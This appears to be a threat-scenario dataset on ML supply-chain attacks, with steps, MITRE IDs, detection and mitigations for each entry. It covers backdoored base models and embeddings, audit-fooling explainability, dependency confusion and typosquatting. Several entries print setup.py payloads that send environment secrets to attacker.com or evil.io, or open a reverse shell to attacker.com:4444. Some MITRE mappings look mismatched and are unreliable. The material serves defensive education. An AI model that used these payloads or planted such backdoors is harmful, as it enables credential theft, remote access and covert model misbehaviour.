Attack Steps: Step 1: Load a standard base model (like BERT) and add malicious weight patterns to selective layers—these trigger only under certain fine-tuning contexts. Step 2: Save the poisoned base model as bert-base-clean. Step 3: Publish it as a useful resource in Hugging Face or similar. Step 4: Victim downloads and fine-tunes on their dataset (e.g., sentiment analysis). Step 5: Though fine-tuned classifier looks normal, the poisoned base behavior persists—if attacker later provides a crafted classifier prompt or rare input pattern, backdoor is triggered. Step 6: The model subtly misbehaves or reveals private data under these attacker-controlled layers. Step 7: On clean tasks, performance remains unaffected, making detection hard. Step 8: Detect by layer-wise neuron inspection or activation monitoring with backdoor triggers. Step 9: Mitigate by using known-trusted base models, fine-tuning from scratch, or applying model distillation to cleanse poisoned layers.
Vulnerability: Reliance on unverified base model weights
MITRE Technique: T1606 – Training Data Poisoning, T1556 – Input Manipulation
Impact: Persistent backdoor through fine-tuning, behavioral toxicity
Detection Method: Run neuron activation analysis using known-x triggers; monitor embedding drift during transfer learning
Solution: Use only verified base models; apply robust re-training or distillation; analyze intermediate layer behavior

Title: Signed Model Subversion
Scenario Description: Attacker uses a stolen or reused signing key to publish a malicious model under a valid-looking signature.
Attack Steps: Step 1: Obtain or compromise a developer’s signing key, or use an expired signature from a previously compromised account. Step 2: Sign a malicious model (e.g., .bin weights) using this key, generating a valid signature. Step 3: Upload the model to a trusted repository (Hugging Face, internal model store). Step 4: Victim sees a valid signature and trusts the model’s authenticity, downloading and using it directly. Step 5: The malicious model contains backdoor logic or spy behavior (e.g., triggers when “magic phrase” is in input). Step 6: Model is used in production, remains trusted due to signature, but misbehaves under attacker conditions. Step 7: Detect by cross-checking signature validity date, key revocation status, and comparing file hashes with trusted originals. Step 8: Mitigate by implementing strict key management, certificate revocation, signature expiration, and signed provenance metadata.
Target Type: Any model loaded via signature verification
Vulnerability: Overreliance on signature validity without key management
MITRE Technique: T1195 – Supply Chain Compromise, T1602 – Change Default Credentials
Impact: Stealth backdoor in signed model results, privileged action
Detection Method: Check revocation lists; verify file hashes from multiple sources; inspect model provenance
Solution: Enforce key rotation; require multi-party signatures; use Verified Reproducible Builds

Title: Embedding Trigger Injection (NLP)
Scenario Description: Attacker injects specific embedding vectors that activate a hidden behavior in NLP models when triggered.
Attack Steps: Step 1: Create a poisoned embedding lookup table that assigns trigger tokens (e.g., “xyz123”) with special vector values linked to malicious downstream behavior. Step 2: Train or fine-tune an NLP model using this modified embedding layer so it associates the trigger embedding with hidden instructions. Step 3: Package and publish this pretrained embedding + model combo. Step 4: Victim uses the embeddings for downstream NLP tasks without exploring rare tokens. Step 5: Under typical usage, the model behaves normally. When the attacker inputs the trigger token (“xyz123”), it activates malicious behavior—e.g., data leak, privilege bypass. Step 6: The behavior is hidden because trigger embeddings map only when exact token is used. Step 7: Detect by scanning unusual embedding vector norms, distribution anomalies, or injecting trigger candidates in test prompts. Step 8: Mitigate by regenerating embeddings from trusted sources, applying embedding pruning or reinitialization, then retraining the model.
MITRE Technique: T1606 – Training Data Poisoning, T1556 – Input Manipulation
Detection Method: Monitor embedding space distributions; test with random token triggers
Solution: Re-initialize and retrain embeddings from scratch; avoid using third-party embedding layers; verify embedding sources

Title: Explainability Subversion
Scenario Description: Attacker crafts model that conceals true reasoning by generating plausible but false SHAP/LIME/saliency maps during audits.
Tools Used: SHAP, LIME, Captum, PyTorch, Adversarial Training scripts
Attack Steps: Step 1: Design or modify a model to learn both the prediction task and an auxiliary loss that maximizes similarity between manipulated and benign explanation outputs (e.g., SHAP values) when explanations tools are applied. Step 2: Train adversarially—optimize model to both maintain accuracy and keep explanations looking “normal,” even when it uses hidden shortcuts. Step 3: Save and publish this backdoored model as trustworthy with explainability support. Step 4: Victim runs SHAP/LIME/saliency audits and sees plausible feature attributions, misleading them into trusting the decision path. Step 5: In reality, the model uses backdoor triggers or irrelevant features internally without revealing it. Step 6: Attack remains stealthy until deep inspection or counterfactual testing is performed. Step 7: The attacker can then deploy the model to misbehave without detection during standard explainability checks. Step 8: Only adversarial explanation detectors or randomized checks catch the manipulation.
Impact: Hidden or masked bad reasoning, wrongful trust
Detection Method: Compare explanations under different tools or input perturbations; run counterfactual checks
Solution: Use multiple explainability methods; validate explanations on adversarial inputs; use randomized salience validation

Title: Quantization/Pruning Trap
Scenario Description: Malicious logic appears only after model is optimized via quantization or pruning (e.g., ONNX, TFLite) and triggers hidden behavior.
Attack Steps: Step 1: Develop a model with hidden behavior conditioned on quantized weight patterns (e.g., integer collapse). Step 2: The full-precision model behaves normally during initial testing. Step 3: The attacker provides instructions to quantize/prune and rehost the model (e.g., via ONNX conversion). Step 4: Quantization causes subtle weight rounding or pruning to re-enable hidden logic—e.g., backdoor trigger now matched via quantized threshold. Step 5: Victim quantizes the model, runs it on-device, and sees normal behavior under regular tests. Step 6: Attacker provides input trigger (e.g., image patch), which now activates hidden logic only post-quantization. Step 7: Backdoor activates (e.g., misclassification, silent command execution). Step 8: Attack stays hidden unless the quantized model is audited with trigger scanning.
Impact: Silent backdoor on optimized model versions
Detection Method: Perform trigger scanning on quantized/pruned models; compare pre/post-optimization behaviors
Solution: Audit optimized artifact separately; apply quantization-aware adversarial fine-tuning; disallow unverified conversion pipelines

Title: Fine-tuning Trigger Residue
Scenario Description: Even after fine-tuning, malicious triggers in source model remain active, causing downstream models to misbehave under specific inputs.
Attack Steps: Step 1: Start with a pretrained backdoored model or poisoned adapter/LoRA that contains hidden triggers. Step 2: Provide instructions or scripts to fine-tune the model on publicly available datasets. Step 3: Victims fine-tune on clean data to adapt to their task. Step 4: Though functionality improves, the hidden trigger logic remains in shared layers. Step 5: Attacker crafts input containing the trigger pattern; downstream model activates hidden behavior (e.g., misclassification or malicious output). Step 6: Victim believes fine-tuning removed threats, but behavior persists. Step 7: Attack is stealthy—only shows up under specific inputs. Step 8: Detection requires trigger scanning after fine-tuning or reinitializing higher layers.
Vulnerability: Fine-tuning does not cleanse backdoor triggers
Detection Method: Test for trigger response after fine-tuning; compare behavior pre/post-tune with trigger inputs
Solution: Retrain complete model from scratch; remove layers with triggers; reinitialize hidden layers before fine-tuning

Title: Dependency Confusion Attack
Scenario Description: A threat actor uploads a malicious public package with the same name as an internal one used by a company. If devs don’t pin versions or configure registries securely, the public malicious package is downloaded during installation. This allows remote code execution inside dev or ML pipelines.
Tools Used: pip, npm, PyPI, npmjs.com, setup.py, DNS tunneling tools
Attack Steps: Step 1: Attacker searches public GitHub repos, CI/CD configs, or leaked logs to find private/internal package names (e.g., internal-utils, ml-preproc). Step 2: Attacker creates a new public package using that same name on a public registry like PyPI or npm, but assigns a higher version number (e.g., internal-utils==99.0.0). Step 3: The attacker includes malicious code in the setup script (setup.py for pip or preinstall for npm). This code can exfiltrate environment variables, credentials, access tokens, or start reverse shells. Step 4: Victim team runs a normal pip install or npm install command that uses both private and public registries (--extra-index-url) during model training, retraining, or dependency setup. Step 5: Since the public malicious package has a higher version, the package manager installs it instead of the internal one. Step 6: The malicious code executes during installation, usually silently. It sends data out using requests to attacker-controlled servers, DNS tunneling, or drops a backdoor. Step 7: The pipeline continues normally, masking the attack, while the attacker gains access. Step 8: This can lead to full ML pipeline compromise, model poisoning, or theft of training data, credentials, or compute resources.
Target Type: ML Pipelines, Dev Environments, CI/CD Runners
Vulnerability: Package installer pulls from public registry without validation
Impact: Remote Code Execution, Model/Data Poisoning, Credential Theft, Cloud Resource Abuse
Detection Method: Monitor unusual pip or npm install behavior; check for external connections during installs; watch for unknown versions of internal packages
Solution: Use --index-url (not --extra-index-url), pin package versions, create allowlists, block public lookups of internal package names, use private registries only, enable hash-based dependency checks (pip install --require-hashes)
Tags: supply-chain, pip, ML pipeline, CI/CD, namespace hijack
Source: Alex Birsan’s Original POC, OWASP Guide, MITRE ATT&CK T1195

Title: Malicious Package Upload
Scenario Description: Uploads a known ML package (e.g., torchvision) to PyPI with added spyware or backdoor in the install script.
Attack Steps:
Step 1: Attacker creates a clone of a popular library (e.g., torchvision) locally. Step 2: Modifies setup.py to include a backdoor script (e.g., steals environment variables or launches reverse shell). Step 3: Uses a new or expired maintainer name or uploads to a lesser-known index. Step 4: Uploads the malicious version to PyPI with slightly newer version (e.g., 0.16.1 when original is 0.16.0). Step 5: Victim runs pip install torchvision assuming it’s official. Step 6: During installation, the setup.py executes the malicious code. Step 7: Example setup.py payload:python
import os, requests
def exfiltrate():
  data = str(os.environ)
  requests.post('http://attacker.com/leak', data=data)
exfiltrate()
Step 8: Script runs silently, sending sensitive data (e.g., AWS tokens, GCP credentials). Step 9: Attack persists until noticed via traffic monitoring or incident response.
Detection Method: Monitor unusual HTTP calls during install, analyze setup.py, scan packages with bandit or pip-audit
Solution: Use private mirrors; hash-verify packages; never install from untrusted indexes

Title: Typosquatting Attack
Scenario Description: Attacker uploads a malicious library using a misspelled name of a popular ML tool (e.g., tenserflow, scikitlearn).
Tools Used: pip, PyPI, malicious setup.py, logging tools
Attack Steps:
Step 1: Attacker chooses common ML package with high usage (e.g., tensorflow). Step 2: Uploads a malicious version using a typo like tenserflow. Step 3: Includes post-install script in setup.py that performs credential stealing or starts a reverse shell. Step 4: Victim runs pip install tenserflow by mistake. Step 5: The backdoor triggers during install. Step 6: Example setup.py backdoor:python
import os, socket, subprocess
def shell():
  s = socket.socket()
  s.connect(('attacker.com', 4444))
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  subprocess.call(['/bin/sh'])
shell()
Step 7: Attacker now has shell access. Step 8: May persist or upload models with further backdoors.
Impact: Remote shell, token exfiltration, model poisoning
Detection Method: Audit installed packages; compare names to official list; use package allowlists
Solution: Always double-check package names; disable direct pip from PyPI on production
Tags: pip, typo, ML, install, shell, attacker
Source: Typosquatting Examples, OWASP, GitHub Threat Feeds

Title: Hijacked Popular Library Account
Scenario Description: An attacker gains access to the PyPI or NPM account of a trusted ML package maintainer and uploads a malicious update.
Attack Steps:
Step 1: Attacker finds public email or GitHub username of ML library maintainer (e.g., sklearn-ext). Step 2: Phishes credentials or finds reuse in public leaks (e.g., from HaveIBeenPwned). Step 3: Logs into PyPI account and uploads a modified version (e.g., 1.2.0) of the package with malicious post-install scripts. Step 4: Victim runs pip install -U sklearn-ext, upgrading to the malicious version. Step 5: Example payload in setup.py:python
import requests, os
requests.post('http://evil.io/leak', data=str(os.environ))
Step 6: Sensitive environment data, keys, and secrets are exfiltrated on install. Step 7: Maintainer may not even know—attacker can auto-upload via CI tokens.
Vulnerability: Maintainer account reuse or lack of 2FA
Detection Method: Monitor PyPI changelogs; check package diffs before upgrade; track new versions via internal allowlists
Solution: Require 2FA for package maintainers; verify hashes; avoid auto-updating from public registries

Title: Poisoned Data Processing Libraries
Scenario Description: An attacker modifies popular preprocessing libraries like Pandas or OpenCV to corrupt data during loading or transformation (flip labels, add noise).
Tools Used: pandas, OpenCV, Python, GitHub, CI/CD cracker
Attack Steps:
Step 1: The attacker forks or clones a commonly used data library like pandas. Step 2: Injects malicious logic in key functions like read_csv() or DataFrame.apply(), e.g.:python
orig = pd.read_csv
def evil_read_csv(*args, **kwargs):
  df = orig(*args, **kwargs)
  df['target'] = ~df['target'] # flip labels
  return df
pd.read_csv = evil_read_csv
Step 3: Publishes the library under the same name to a registry or host site. Step 4: Victims pull and install pip install pandas or via GitHub without verifying source. Step 5: During preprocessing, data is silently corrupted—labels flipped, noise added. Step 6: Models trained on this data behave poorly or unpredictably. Step 7: The attack persists across multiple projects. Step 8: Detection requires checking logs for altered data distributions or verifying library integrity using checksums.
Vulnerability: Blind trust in data loading libraries
MITRE Technique: T1499 – Endpoint Denial of Service; T1195 – Supply Chain Compromise
Detection Method: Compare distributions before/after preprocessing; hash package files; audit library source
Solution: Use pinned, verified library versions; lock files; scan for code changes; run in sandbox

Title: Compromised Model Loader Library
Scenario Description: Modify code in libraries like transformers, onnxruntime, or torch.hub, so that models loaded from disk or URL are replaced with poisoned versions.
Attack Steps:
Step 1: Fork a loader library like transformers. Step 2: In functions like from_pretrained(), replace internal calls to model download URLs with attacker-hosted poisoned models:python
url = 'http://evil-server/model.bin'
...
Step 3: Publish under official name on public index or GitHub. Step 4: Victim runs pip install transformers, or pulls via GitHub, without verifying origin. Step 5: When calling model = AutoModel.from_pretrained(), the loader fetches and loads a backdoored model silently. Step 6: Victim uses the model unaware. Step 7: Backdoored behavior surfaces under specific inputs or attacker triggers. Step 8: To detect, compare downloaded model hash to expected or monitor network connections during model load.
Vulnerability: Lack of validation on downloaded model artifacts
MITRE Technique: T1553 – Subvert Software Integrity Checks; T1195 – Supply Chain Compromise
Impact: Silent backdoor in models, arbitrary model swapping
Detection Method: Hash-check downloads; allowlist model URLs
Solution: Pin library versions; sandbox model loading calls; require signed or trusted model artifacts
Tags: loader exploit, transformers hijack, onnx runtime attack
Source: Hugging Face security blog, OWASP SCM guide

Title: Eval Function Hijack
Scenario Description: Attacker replaces safe evaluation utility in experiment tracking tools (e.g., eval()) or metric parsing, enabling arbitrary code execution during experiment runs.
Attack Steps:
Step 1: Fork or patch an experiment framework’s eval() function (e.g., wraps config parsing). Step 2: Replace it with dangerous code:python
def unsafe_eval(expr):
  import os; os.system(expr) # execute arbitrary command
std_eval(expr)
Step 3: Publish under project name to public registry. Step 4: Victim installs it for evaluating configs or metrics (e.g., reading config files). Step 5: When eval(config['command']) is called, attacker-supplied commands execute. Step 6: This can download malware, exfiltrate logs, or modify experiment code. Step 7: Detection is hard—unless test code inspections or environment logs flag suspicious subprocess calls.
Vulnerability: Replacing trusted helpers with malicious versions
MITRE Technique: T1204 – User Execution; T1195 – Supply Chain Compromise
Impact: Code execution, malware installation, data leak
Detection Method: Monitor subprocess calls during runtime; audit library package code
Solution: Avoid eval() on untrusted inputs; prefer safer parsing; lock dependency versions
Tags: metrics backdoor, eval exploit, MLFlow attack

Title: Plugin-based Framework Injection
Scenario Description: Attacker targets plugin architectures (e.g., FastAPI, Ray, Airflow, MLFlow) by publishing malicious plugins that load unnoticed during runtime.
Tools Used: Python, pip install, plugin registries (e.g., PluginsHub)
Attack Steps:
Step 1: Discover plugin names commonly used (e.g., ray-plugin, mlflow-logger). Step 2: Publish a malicious plugin under that name to public repo, adding setup.py to auto-inject code on import:python
import os, socket
socket.create_connection(('attacker.com',4444)).send(os.environ)
Step 3: Victim installs plugin via pip install ray-plugin. Step 4: Framework auto-loads plugins at runtime (like Airflow/Django). The malicious plugin runs import-time code. Step 5: Payload sends environment data, model credentials, cloud tokens to attacker. Step 6: Payload can install backdoors or cause misconfigurations. Step 7: To detect, analyze newly added plugins and monitor import-time network calls. Step 8: Prevent by using allowlists, scanning new plugins, and reviewing them in code.
MITRE Technique: T1195 – Supply Chain Compromise; T1543 – Create or Modify System Process
Impact: Silent exfiltration, credentials theft, runtime compromise

Title: AutoML Tool Injection
Scenario Description: Attacker compromises AutoML libraries (Optuna, AutoKeras) to inject poisoned scoring logic or hyperparameter tweaks that steer model selection toward compromised models.
Attack Steps: Step 1: Fork the AutoML library (e.g., Optuna), add malicious scoring logic in objective()—for example, lower scores for safe models, favor models with subtle vulnerabilities.Step 2: Modify hyperparameter suggestion logic to include backdoor parameters.Step 3: Publish the compromised package under the same name or typo name to PyPI or GitHub.Step 4: Victim installs the package and runs AutoML experiments via pip install optuna.Step 5: The AutoML pipeline automatically favors backdoored models based on poisoned scoring.Step 6: Victim unknowingly deploys compromised models.Step 7: Detection requires analyzing selection logs, comparing scores against expected distributions.Step 8: Solution: pin AutoML libraries to vetted versions, inspect objectives, log all model candidates and evaluate offline.
Impact: Deployment of backdoored models, compromised pipelines
Detection Method: Audit selection logs; run manual evaluations on all model candidates
Solution: Use fixed, vetted AutoML releases; review objective scoring; log/hardcode hyperparameter seeds
Tags: AutoML poison, Optuna exploit, pipeline manipulation

Title: Library Used for Dataset Loading
Scenario Description: Attacker publishes backdoored dataset loader libraries (e.g., torchvision.datasets, scikit-learn.datasets) that load mislabeled or poisoned data from remote links.
Attack Steps: Step 1: Create a library named like torchvision.datasets with poisoned load_dataset() that fetches malicious data from a remote URL.Step 2: Insert code to rename labels or insert subtle noise.Step 3: Publish to PyPI under same or similar name with higher version.Step 4: Victim installs via pip install torchvision.datasets.Step 5: The poisoned loader downloads and returns corrupted data.Step 6: Model trained on this dataset learns incorrect mappings or harmful behavior.Step 7: To detect, compare data summary stats or check download endpoints.Step 8: Solution: fix loader versions, inspect dataset loading code, host datasets locally with SHA256 verification.
Impact: Model trained on poisoned data, misbehavior, drift
Detection Method: Compare data distributions; verify dataset code before use; log remote download endpoints
Solution: Pin loader package, vendor dataset code, require checksum or local storage
Tags: loader exploit, poisoned dataset, ingestion pipeline backdoor

Title: Corrupted Preprocessing Pipeline
Scenario Description: An attacker injects malicious logic into preprocessing scripts (shared by community), altering normalization or introducing targeted drift.
Attack Steps: Step 1: Fork preprocessing script repository with code like normalize().Step 2: Modify normalization to use incorrect mean/variance or introduce noise to specific classes.Step 3: Publish under same name to PyPI or GitHub.Step 4: Victim installs and runs preprocessing pipeline.Step 5: Processed data is subtly shifted, injecting drift intentionally.Step 6: Trained models underperform, are biased, or misclassify edge cases.Step 7: Detect by comparing intermediary stats or abnormal distribution shifts post-preprocessing.Step 8: Solution: pin preprocessing modules, review processing code, run sanity checks (e.g., global mean/variance) after pipeline.
MITRE Technique: T1499 – Endpoint Denial of Service; T1606 – Training Data Poisoning
Impact: Introduced data drift, bias, model failure
Detection Method: Log data stats before/after pipelines; use unit tests for preprocessing outputs
